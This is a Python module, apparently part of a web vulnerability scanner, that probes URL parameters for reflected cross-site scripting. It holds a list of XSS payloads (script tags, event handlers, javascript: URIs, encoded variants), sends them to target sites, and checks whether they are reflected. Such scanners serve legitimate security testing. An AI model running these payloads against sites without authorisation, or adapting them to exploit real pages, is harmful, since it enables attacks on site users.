import requests
import re
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; CyberWings-Scanner/1.0)",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
}

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "javascript:alert('XSS')",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "\"onmouseover=\"alert('XSS')",
    "';alert('XSS')//",
]


def inject_payload(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def check_xss(url: str) -> dict:
    result = {
        "url": url,
        "vulnerable": False,
        "risk_level": "Low",
        "parameters_tested": [],
        "vulnerable_params": [],
        "findings": [],
        "csp_present": False,
        "csp_header": None,
        "x_xss_protection": None,
        "error": None,
        "total_tests": 0,
        "reflected_count": 0,
    }

    try:
        # First fetch — check headers
        try:
            base_resp = requests.get(url, headers=HEADERS, timeout=8, allow_redirects=True)
            resp_headers = base_resp.headers

            csp = resp_headers.get("Content-Security-Policy", "")
            result["csp_present"] = bool(csp)
            result["csp_header"] = csp or "Not Set"
            result["x_xss_protection"] = resp_headers.get("X-XSS-Protection", "Not Set")

            if csp:
                result["findings"].append({
                    "type": "info",
                    "message": "Content-Security-Policy header is present — may mitigate some XSS vectors.",
                })
            else:
                result["findings"].append({
                    "type": "warning",
                    "message": "No Content-Security-Policy header found — XSS may be more impactful.",
                })
        except Exception:
            pass

        # Determine params
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            # Inject dummy param
            test_base = url + ("?" if "?" not in url else "&") + "q=test"
            parsed = urlparse(test_base)
            params = parse_qs(parsed.query)
            result["findings"].append({
                "type": "info",
                "message": "No URL parameters found. Testing with injected 'q' parameter.",
            })

        result["parameters_tested"] = list(params.keys())

        for param in params:
            for payload in XSS_PAYLOADS:
                result["total_tests"] += 1
                test_url = inject_payload(url, param, payload)

                try:
                    resp = requests.get(test_url, headers=HEADERS, timeout=8, allow_redirects=True)
                    body = resp.text

                    # Check reflection — exact or decoded
                    reflected = (
                        payload in body or
                        payload.lower() in body.lower() or
                        re.search(re.escape(payload[:20]), body, re.IGNORECASE) is not None
                    )

                    if reflected:
                        result["vulnerable"] = True
                        result["reflected_count"] += 1
                        result["vulnerable_params"].append(param)
                        result["findings"].append({
                            "type": "reflected_xss",
                            "param": param,
                            "payload": payload[:80],
                            "message": f"XSS payload REFLECTED in response for param '{param}'",
                        })
                        break  # Move to next param after finding one vuln

                except requests.exceptions.RequestException:
                    pass

            result["vulnerable_params"] = list(set(result["vulnerable_params"]))

        if result["vulnerable"]:
            result["risk_level"] = "High"
            if result["reflected_count"] > 3:
                result["risk_level"] = "Critical"
        else:
            result["findings"].append({
                "type": "info",
                "message": "No reflected XSS vulnerabilities detected in tested parameters.",
            })

    except Exception as e:
        result["error"] = f"Scanner error: {str(e)}"

    return result
